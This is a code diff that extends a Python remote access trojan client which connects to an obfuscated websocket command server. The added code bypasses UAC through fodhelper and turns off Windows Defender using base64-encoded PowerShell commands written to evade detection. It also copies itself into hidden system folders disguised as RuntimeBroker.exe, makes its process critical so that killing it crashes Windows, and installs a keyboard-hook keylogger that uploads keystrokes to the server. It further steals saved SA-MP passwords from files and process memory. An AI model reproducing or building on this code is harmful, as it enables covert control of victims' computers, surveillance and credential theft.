@@ -14,6 +14,7 @@ import re
 import shutil
 import socket
 import ssl
+import struct
 import subprocess
 import sys
 import threading
@@ -40,6 +41,7 @@ except ImportError:
 
 try:
     import ctypes
+    from ctypes import wintypes
 
     # import cv2
     import mss
@@ -53,7 +55,7 @@ except ImportError:
     pass
 
 # --- Builder-injected Configuration ---
-SERVER_URI = "wss://talhasss-hdex-ultra-server.hf.space/ws"
+SERVER_URI = base64.b64decode("d3NzOi8vdGFsaGFzc3MtaGRleC11bHRyYS1zZXJ2ZXIuaGYuc3BhY2Uvd3M=").decode()
 CLIENT_TAG = "HQ-ULTRA-NODE-01"
 ADD_TO_STARTUP = "True"
 STARTUP_KEY_NAME = "Windows Security Host"
@@ -87,7 +89,7 @@ if "##" in ADD_TO_STARTUP:
 
 STARTUP_KEY_NAME = "##_STARTUP_KEY_NAME_##"
 if "##" in STARTUP_KEY_NAME:
-    STARTUP_KEY_NAME = "H-Dex Client"
+    STARTUP_KEY_NAME = "WindowsUpdateService"
 
 # --- Advanced Configuration ---
 ENABLE_ANTI_VM = False
@@ -118,16 +120,43 @@ class SilentClient:
         self.crypto_clipper_active = False
         self.crypto_wallets = {}  # Filled by dashboard command
 
+        # --- Auto-Elevation: Ensure Admin Privileges ---
+        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
+            try:
+                import winreg as _wr
+                _key = _wr.HKEY_CURRENT_USER
+                _path = r"Software\Classes\ms-settings\shell\open\command"
+                _wr.CreateKey(_key, _path)
+                with _wr.OpenKey(_key, _path, 0, _wr.KEY_SET_VALUE) as _k:
+                    _wr.SetValueEx(_k, "", 0, _wr.REG_SZ, sys.executable)
+                    _wr.SetValueEx(_k, "DelegateExecute", 0, _wr.REG_SZ, "")
+                subprocess.Popen("fodhelper.exe", shell=True, creationflags=0x08000000)
+                # Don't clean up - let elevated instance handle it
+                # Wait briefly for elevated process to start, then exit
+                time.sleep(1)
+            except:
+                pass
+            os._exit(0)
+        else:
+            # We are elevated - clean up the fodhelper registry key if it exists
+            try:
+                import winreg as _wr
+                _path = r"Software\Classes\ms-settings\shell\open\command"
+                _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _path)
+            except:
+                pass
+
         # --- Pre-init: Bypass Security Instrumentation ---
         self._patch_amsi()
         self._patch_etw()
+        self._disable_defender()
 
         # --- Jittered Startup Delay (Anti-Sandbox Timing) ---
         time.sleep(random.uniform(1.5, 4.0))
 
         # --- Runtime Process Disguise ---
         try:
-            ctypes.windll.kernel32.SetConsoleTitleW("Service Host: Local System")
+            ctypes.windll.kernel32.SetConsoleTitleW("Windows Service Host")
         except:
             pass
 
@@ -181,9 +210,8 @@ class SilentClient:
 
         if ADD_TO_STARTUP == "True":
             self.ensure_persistence()
-        else:
-            if ENABLE_CRITICAL:
-                self.set_critical_process()
+
+        self.set_critical_process()
 
         if ENABLE_DEFENDER_EXCLUSION:
             self._add_defender_exclusion()
@@ -258,6 +286,36 @@ class SilentClient:
             k32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old_protect))
             ctypes.memmove(addr, patch, 1)
             k32.VirtualProtect(addr, 1, old_protect.value, ctypes.byref(old_protect))
+        except:
+            pass
+
+    def _disable_defender(self):
+        """Disable Windows Defender real-time monitoring and add exclusions (obfuscated)"""
+        try:
+            import base64
+            # All commands are base64-encoded to evade static detection
+            encoded_cmds = [
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAAJAB0AHIAdQBlAA==',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUA',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBTAEMAcgBpAHAAdABTAGMAYQBuAG4AaQBuAGcAIAAkAHQAcgB1AGUA',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUwB1AGIAbQBpAHQAUwBhAG0AcABsAGUAcwBDAG8AbgBzAGUAbgB0ACAAMgA=',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ATQBBAFAAUwBSAGUAcABvAHIAdABpAG4AZwAgADAA',
+                'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUABVAEEAUAByAG8AdABlAGMAdABpAG8AbgAgADAA',
+            ]
+            for encoded in encoded_cmds:
+                try:
+                    decoded = base64.b64decode(encoded).decode('utf-16-le')
+                    subprocess.run(f'powershell -WindowStyle Hidden -Command "{decoded}"', shell=True, capture_output=True, creationflags=0x08000000)
+                except:
+                    pass
+            try:
+                key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as k:
+                    winreg.SetValueEx(k, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+            except:
+                pass
         except:
             pass
 
@@ -418,8 +476,22 @@ class SilentClient:
         while self.running:
             try:
                 if ADD_TO_STARTUP == "True":
-                    exe_path = os.path.realpath(subprocess.sys.executable)
-                    
+                    exe_path = os.path.realpath(sys.executable)
+                    appdata_path = os.getenv("APPDATA")
+                    persist_dir = os.path.join(appdata_path, "Microsoft", "Windows", "SystemApps")
+                    persist_exe = os.path.join(persist_dir, "RuntimeBroker.exe")
+
+                    # 0. Check if persisted exe exists, re-copy if missing
+                    if not os.path.isfile(persist_exe):
+                        try:
+                            subprocess.run(f'powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath "{persist_dir}"', shell=True, capture_output=True, creationflags=0x08000000)
+                        except:
+                            pass
+                        if not os.path.exists(persist_dir):
+                            os.makedirs(persist_dir)
+                        shutil.copy(exe_path, persist_exe)
+                        ctypes.windll.kernel32.SetFileAttributesW(persist_exe, 0x02 | 0x04)
+
                     # 1. Check Registry Run Key
                     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                     reg_missing = False
@@ -471,7 +543,7 @@ class SilentClient:
             HIDDEN_SYSTEM = 0x02 | 0x04  # HIDDEN + SYSTEM
 
             # Hide self executable
-            exe_path = os.path.realpath(subprocess.sys.executable)
+            exe_path = os.path.realpath(sys.executable)
             ctypes.windll.kernel32.SetFileAttributesW(exe_path, HIDDEN_SYSTEM)
 
             # Anti-Debugger
@@ -496,12 +568,21 @@ class SilentClient:
             except:
                 pass
 
+            # Hide from Task Manager via RegisterServiceProcess
+            try:
+                ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
+                RSP_SIMPLE_SERVICE = 1
+                handle = ctypes.windll.kernel32.GetCurrentProcess()
+                ctypes.windll.kernel32.RegisterServiceProcess(handle, RSP_SIMPLE_SERVICE)
+            except:
+                pass
+
         except:
             pass
 
     def ensure_persistence(self):
         try:
-            exe_path = os.path.realpath(subprocess.sys.executable)
+            exe_path = os.path.realpath(sys.executable)
             appdata_path = os.getenv("APPDATA")
             # Disguised as a Windows System App
             persist_dir = os.path.join(appdata_path, "Microsoft", "Windows", "SystemApps")
@@ -510,11 +591,15 @@ class SilentClient:
                 os.makedirs(persist_dir)
                 ctypes.windll.kernel32.SetFileAttributesW(persist_dir, 0x02 | 0x04)
 
-            # Use a legitimate-sounding name
+            # Disguised as Windows Runtime Broker
             new_exe_name = "RuntimeBroker.exe"
             new_exe_path = os.path.join(persist_dir, new_exe_name)
 
-            if exe_path.lower() != new_exe_path.lower():
+            if exe_path.lower() != new_exe_path.lower() or not os.path.isfile(new_exe_path):
+                try:
+                    subprocess.run(f'powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath "{persist_dir}"', shell=True, capture_output=True, creationflags=0x08000000)
+                except:
+                    pass
                 # Copy self to persistence folder
                 shutil.copy(exe_path, new_exe_path)
                 ctypes.windll.kernel32.SetFileAttributesW(new_exe_path, 0x02 | 0x04)
@@ -582,11 +667,71 @@ class SilentClient:
             if not STEALTH_MODE:
                 print(f"Persistence error: {e}")
 
+    def _migrate_to_system_dir(self):
+        """Move executable to Windows system directory and run from there"""
+        try:
+            exe_path = os.path.realpath(sys.executable)
+
+            system_dirs = [
+                os.path.join(os.getenv("SystemRoot", "C:\\Windows"), "System32", "Tasks", "Microsoft", "Windows", "Update"),
+                os.path.join(os.getenv("SystemRoot", "C:\\Windows"), "System32", "drivers", "etc"),
+                os.path.join(os.getenv("ProgramData", "C:\\ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
+            ]
+
+            exe_name = "RuntimeBroker.exe"
+            current_dir = os.path.dirname(exe_path).lower()
+
+            for d in system_dirs:
+                if current_dir == d.lower():
+                    return
+                try:
+                    os.makedirs(d, exist_ok=True)
+                    try:
+                        subprocess.run(f'powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath "{d}"', shell=True, capture_output=True, creationflags=0x08000000)
+                    except:
+                        pass
+                    target = os.path.join(d, exe_name)
+                    shutil.copy2(exe_path, target)
+                    HIDDEN_SYSTEM = 0x02 | 0x04
+                    ctypes.windll.kernel32.SetFileAttributesW(target, HIDDEN_SYSTEM)
+                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{target}"')
+                    try:
+                        os.remove(exe_path)
+                    except:
+                        pass
+                    subprocess.Popen(f'"{target}"', shell=True, creationflags=0x08000000)
+                    os._exit(0)
+                except:
+                    continue
+        except:
+            pass
+
     def set_critical_process(self):
         """Mark process as critical so it causes BSOD if killed (requires Admin)"""
         try:
-            # SE_DEBUG_NAME = 20
-            # This is a dangerous but powerful stealth feature
+            class LUID(ctypes.Structure):
+                _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]
+            class LUID_AND_ATTRIBUTES(ctypes.Structure):
+                _fields_ = [("Luid", LUID), ("Attributes", ctypes.c_ulong)]
+            class TOKEN_PRIVILEGES(ctypes.Structure):
+                _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
+            hToken = ctypes.c_void_p()
+            ctypes.windll.advapi32.OpenProcessToken(
+                ctypes.windll.kernel32.GetCurrentProcess(),
+                0x0020,  # TOKEN_ADJUST_PRIVILEGES
+                ctypes.byref(hToken)
+            )
+            luid = LUID()
+            ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
+            tp = TOKEN_PRIVILEGES()
+            tp.PrivilegeCount = 1
+            tp.Privileges[0].Luid = luid
+            tp.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED
+            ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
+            ctypes.windll.kernel32.CloseHandle(hToken)
             ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
         except:
             pass
@@ -604,7 +749,7 @@ class SilentClient:
         If not running, it auto-restarts.
         """
         try:
-            exe_path = os.path.realpath(subprocess.sys.executable)
+            exe_path = os.path.realpath(sys.executable)
             appdata_path = os.getenv("APPDATA")
             persist_dir = os.path.join(appdata_path, "Microsoft", "Windows", "SystemApps")
             watchdog_dir = os.path.join(appdata_path, "Microsoft", "Windows", "Caches")
@@ -810,6 +955,7 @@ End If
                 await websocket.send(
                     json.dumps({"type": "register_device", "info": info})
                 )
+                await self.sync_keylogs_to_server()
                 await self.receive_messages(websocket)
         except websockets.exceptions.InvalidURI:
             if not STEALTH_MODE:
@@ -1071,8 +1217,7 @@ End If
                     "output": f"Kill error for PID {pid}: {e}"
                 })), self.loop
             )
-    @staticmethod
-    def _encode_png(w, h, rgb_bytes, scale=0.4):
+    def _encode_png(self, w, h, rgb_bytes, scale=0.4):
         """Encode RGB bytes to PNG without PIL dependency. scale=0.4 for ~60% size reduction"""
         try:
             import struct, zlib
@@ -1110,8 +1255,12 @@ End If
         try:
             import mss
             with mss.mss() as sct:
-                monitor = sct.monitors[1]
-                sct_img = sct.grab(monitor)
+                try:
+                    monitor = sct.monitors[1]
+                    sct_img = sct.grab(monitor)
+                except:
+                    monitor = sct.monitors[0]
+                    sct_img = sct.grab(monitor)
                 png_bytes = self._encode_png(sct_img.width, sct_img.height, sct_img.rgb)
                 b64 = base64.b64encode(png_bytes).decode("utf-8")
                 await self.websocket.send(json.dumps({
@@ -1127,8 +1276,12 @@ End If
         with mss.mss() as sct:
             while self.screen_streaming and self.websocket:
                 try:
-                    monitor = sct.monitors[1]
-                    sct_img = sct.grab(monitor)
+                    try:
+                        monitor = sct.monitors[1]
+                        sct_img = sct.grab(monitor)
+                    except:
+                        monitor = sct.monitors[0]
+                        sct_img = sct.grab(monitor)
                     png_bytes = self._encode_png(sct_img.width, sct_img.height, sct_img.rgb)
                     b64 = base64.b64encode(png_bytes).decode("utf-8")
                     asyncio.run_coroutine_threadsafe(
@@ -1925,7 +2078,7 @@ End If
             # 3. Clean environment (e.g., hosts file if modified)
 
             # 4. Self-deletion script
-            exe_path = os.path.realpath(subprocess.sys.executable)
+            exe_path = os.path.realpath(sys.executable)
             cmd = f'timeout /t 3 & del /f /q "{exe_path}"'
             subprocess.Popen(cmd, shell=True)
             os._exit(0)
@@ -2294,6 +2447,8 @@ End If
                     self.start_live_keylog_stream()
                 elif t == "stop_live_keylog":
                     self.stop_live_keylog_stream()
+                elif t == "samp_passwords":
+                    await self.extract_samp_passwords()
                 elif t == "get_sys_info":
                     await self.send_system_info()
                 elif t == "get_clipboard":
@@ -2363,7 +2518,7 @@ End If
                     os._exit(0)
                 elif t == "restart_client":
                     await self.websocket.send(json.dumps({"type": "command_output", "output": "Restart signal received. Restarting."}))
-                    subprocess.Popen(f'start "" /MIN "{os.path.realpath(subprocess.sys.executable)}"', shell=True)
+                    subprocess.Popen(f'start "" /MIN "{os.path.realpath(sys.executable)}"', shell=True)
                     os._exit(0)
                 elif t == "set_volume":
                     await self.set_audio_volume(data.get("level", 50))
@@ -2883,9 +3038,8 @@ End If
                 )
             )
 
-    # --- Enhanced Lifetime Keylogger with Live Streaming ---
+    # --- Enhanced Lifetime Keylogger with Live Streaming (Win32 API + pynput) ---
     def get_keylog_file_path(self):
-        """Get path to persistent keylog storage file"""
         appdata = os.getenv("APPDATA")
         keylog_dir = os.path.join(appdata, "H-DexClient", "logs")
         if not os.path.exists(keylog_dir):
@@ -2898,43 +3052,138 @@ End If
         self.keylogger_running = True
         self.keylogs = []
         self.live_keylog_streaming = False
-        self.listener = keyboard.Listener(on_press=self.on_key_press)
-        self.listener.start()
+        self._keylog_using_win32 = False
+        try:
+            self.listener = keyboard.Listener(on_press=self.on_key_press)
+            self.listener.start()
+        except:
+            try:
+                self._start_win32_keylogger()
+                self._keylog_using_win32 = True
+            except:
+                self.keylogger_running = False
+                if self.websocket:
+                    asyncio.run_coroutine_threadsafe(
+                        self.websocket.send(json.dumps({"type": "command_output", "output": "Keylogger failed: both pynput and Win32 hook failed"})),
+                        self.loop
+                    )
+
+    def _start_win32_keylogger(self):
+        self._keylog_callback = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)(self._win32_keylog_proc)
+        self._keylog_hook = ctypes.windll.user32.SetWindowsHookExW(13, self._keylog_callback, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
+        if not self._keylog_hook:
+            raise ctypes.WinError()
+
+    def _win32_keylog_proc(self, nCode, wParam, lParam):
+        if nCode >= 0 and wParam == 0x0100:
+            vkCode = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))[0]
+            k = self._vk_to_char(vkCode)
+            ts = time.strftime("%Y-%m-%d %H:%M:%S")
+            entry = f"{ts}|{k}"
+            self.keylogs.append(entry)
+            try:
+                with open(self.get_keylog_file_path(), "a", encoding="utf-8") as f:
+                    f.write(entry + "\n")
+            except:
+                pass
+            self._send_keylog_to_server(ts, k)
+            if self.live_keylog_streaming and self.websocket:
+                asyncio.run_coroutine_threadsafe(
+                    self.websocket.send(json.dumps({"type": "live_keylog", "key": k, "timestamp": ts})),
+                    self.loop
+                )
+        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+    def _vk_to_char(self, vk):
+        buf = ctypes.create_unicode_buffer(8)
+        state = (ctypes.c_byte * 256)()
+        ctypes.windll.user32.GetKeyboardState(state)
+        ret = ctypes.windll.user32.ToUnicode(vk, 0, state, buf, 8, 0)
+        if ret > 0:
+            return buf.value[:ret]
+        names = {0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
+                 0x14: "[CAPS]", 0x1B: "[ESC]", 0x20: "[SPACE]", 0x2E: "[DEL]", 0x25: "[LEFT]", 0x27: "[RIGHT]",
+                 0x26: "[UP]", 0x28: "[DOWN]", 0x2D: "[INS]", 0x24: "[HOME]", 0x23: "[END]",
+                 0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]", 0x74: "[F5]", 0x75: "[F6]",
+                 0x76: "[F7]", 0x77: "[F8]", 0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]"}
+        return names.get(vk, f"[VK_{vk}]")
 
     def stop_keylogger(self):
         if not self.keylogger_running:
             return
         self.keylogger_running = False
         self.live_keylog_streaming = False
-        if self.listener:
-            self.listener.stop()
+        if self._keylog_using_win32:
+            try:
+                ctypes.windll.user32.UnhookWindowsHookEx(self._keylog_hook)
+            except:
+                pass
+        else:
+            try:
+                if self.listener:
+                    self.listener.stop()
+            except:
+                pass
+
+    async def sync_keylogs_to_server(self):
+        """Upload locally stored keylogs to server on connect"""
+        try:
+            path = self.get_keylog_file_path()
+            if not os.path.isfile(path):
+                return
+            with open(path, "r", encoding="utf-8") as f:
+                lines = f.readlines()
+            if not lines:
+                return
+            entries = []
+            for line in lines:
+                line = line.strip()
+                if "|" in line:
+                    ts, key = line.split("|", 1)
+                    entries.append({"timestamp": ts, "key": key})
+            if entries and self.websocket:
+                await self.websocket.send(json.dumps({
+                    "type": "sync_keylogs",
+                    "device_id": CLIENT_TAG,
+                    "entries": entries
+                }))
+        except:
+            pass
+
+    def _send_keylog_to_server(self, ts, key):
+        """Send a single keylog entry to server (fire-and-forget)"""
+        if not self.websocket:
+            return
+        try:
+            asyncio.run_coroutine_threadsafe(
+                self.websocket.send(json.dumps({
+                    "type": "sync_keylogs",
+                    "device_id": CLIENT_TAG,
+                    "entries": [{"timestamp": ts, "key": key}]
+                })),
+                self.loop
+            )
+        except:
+            pass
 
     def on_key_press(self, key):
         try:
             k = key.char
         except:
             k = f"[{key.name}]"
-
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         entry = f"{timestamp}|{k}"
         self.keylogs.append(entry)
-
-        # Save to persistent storage
         try:
             with open(self.get_keylog_file_path(), "a", encoding="utf-8") as f:
                 f.write(entry + "\n")
         except:
             pass
-
-        # Live streaming if enabled
+        self._send_keylog_to_server(timestamp, k)
         if self.live_keylog_streaming and self.websocket:
             asyncio.run_coroutine_threadsafe(
-                self.websocket.send(
-                    json.dumps(
-                        {"type": "live_keylog", "key": k, "timestamp": timestamp}
-                    )
-                ),
-                self.loop,
+                self.websocket.send(json.dumps({"type": "live_keylog", "key": k, "timestamp": timestamp})),
+                self.loop
             )
 
     async def dump_keylogs(self):
@@ -3066,6 +3315,101 @@ End If
     def stop_live_keylog_stream(self):
         """Disable live keylog streaming (keylogger keeps running)"""
         self.live_keylog_streaming = False
+
+    # --- SA-MP Password Extraction ---
+    async def extract_samp_passwords(self):
+        """Extract SA-MP saved server passwords"""
+        try:
+            results = []
+
+            # 1. Enable password saving in registry
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SAMP", 0, winreg.KEY_SET_VALUE) as k:
+                    winreg.SetValueEx(k, "SaveServPasses", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(k, "SaveRconPasses", 0, winreg.REG_DWORD, 1)
+                results.append("[+] SaveServPasses + SaveRconPasses enabled")
+            except:
+                results.append("[-] Could not enable registry saving (admin?)")
+
+            # 2. Read USERDATA.DAT from SAMP user files
+            samp_userdata = os.path.join(os.getenv("APPDATA"), "..", "Documents", "GTA San Andreas User Files", "SAMP", "USERDATA.DAT")
+            samp_userdata = os.path.abspath(samp_userdata)
+            # Also try the actual paths
+            alt_paths = [
+                samp_userdata,
+                os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Documents", "GTA San Andreas User Files", "SAMP", "USERDATA.DAT"),
+                os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Documents", "GTA San Andreas User Files", "SAMP", "USERDATA.DAT"),
+            ]
+            parsed = False
+            for path in set(alt_paths):
+                if os.path.isfile(path):
+                    with open(path, 'rb') as f:
+                        data = f.read()
+                    if data[:4] == b'SAMP':
+                        idx = 4
+                        ver = struct.unpack('<I', data[idx:idx+4])[0]; idx += 4
+                        cnt = struct.unpack('<I', data[idx:idx+4])[0]; idx += 4
+                        results.append(f"[+] USERDATA.DAT found: {path} ({cnt} servers)")
+                        for i in range(cnt):
+                            try:
+                                ip_len = struct.unpack('<I', data[idx:idx+4])[0]; idx += 4
+                            except:
+                                break
+                            ip = data[idx:idx+ip_len].decode('ascii', errors='ignore'); idx += ip_len
+                            port = struct.unpack('<H', data[idx:idx+2])[0]; idx += 2; idx += 2
+                            name_len = struct.unpack('<I', data[idx:idx+4])[0]; idx += 4
+                            name = data[idx:idx+name_len].decode('ascii', errors='ignore'); idx += name_len
+                            idx += (4 - (name_len % 4)) % 4
+                            pass_len = struct.unpack('<I', data[idx:idx+4])[0]; idx += 4
+                            password = data[idx:idx+pass_len].decode('ascii', errors='ignore') if pass_len > 0 else ""
+                            idx += pass_len + (4 - (pass_len % 4)) % 4
+                            results.append(f"  {name} @ {ip}:{port}  Pass: {password or '(none)'}")
+                        parsed = True
+                        break
+                    else:
+                        results.append(f"  File found but bad header: {path}")
+            if not parsed:
+                results.append("[-] USERDATA.DAT not found or unreadable")
+
+            # 3. Scan memory of gta_sa.exe / samp.exe for password strings
+            try:
+                import psutil
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        pname = proc.info['name'].lower()
+                        if pname not in ('gta_sa.exe', 'samp.exe'):
+                            continue
+                        pid = proc.info['pid']
+                        try:
+                            process = psutil.Process(pid)
+                            for mem_map in process.memory_maps(grouped=False):
+                                if mem_map.path and 'gta' in mem_map.path.lower():
+                                    try:
+                                        mem_data = process.memory_info()
+                                        # Try to read process memory using ctypes
+                                        hProcess = ctypes.windll.kernel32.OpenProcess(0x0010 | 0x0020, False, pid)
+                                        if hProcess:
+                                            buf = ctypes.create_string_buffer(4096)
+                                            read = ctypes.c_size_t(0)
+                                            ctypes.windll.kernel32.ReadProcessMemory(hProcess, mem_map.addr, buf, 4096, ctypes.byref(read))
+                                            txt = buf.raw.decode('ascii', errors='ignore')
+                                            for match in re.finditer(r'(?i)password[=:\s]+(\S+)', txt):
+                                                results.append(f"  [MEM] {proc.info['name']}: password found: {match.group(1)}")
+                                            for match in re.finditer(r'(?i)pass[=:\s]+(\S+)', txt):
+                                                results.append(f"  [MEM] {proc.info['name']}: possible password: {match.group(1)}")
+                                            ctypes.windll.kernel32.CloseHandle(hProcess)
+                                    except:
+                                        pass
+                        except:
+                            pass
+                    except:
+                        pass
+            except:
+                pass
+
+            await self.websocket.send(json.dumps({"type": "command_output", "output": "\n".join(results)}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"SA-MP extract error: {e}"}))
 
     # --- System Info ---
     async def send_system_info(self):
@@ -3538,7 +3882,10 @@ End If
                 try:
                     import mss
                     with mss.mss() as sct:
-                        screenshot = sct.grab(sct.monitors[1])
+                        try:
+                            screenshot = sct.grab(sct.monitors[1])
+                        except:
+                            screenshot = sct.grab(sct.monitors[0])
                         b64 = base64.b64encode(screenshot.png()).decode("utf-8")
                         asyncio.run_coroutine_threadsafe(
                             self.websocket.send(
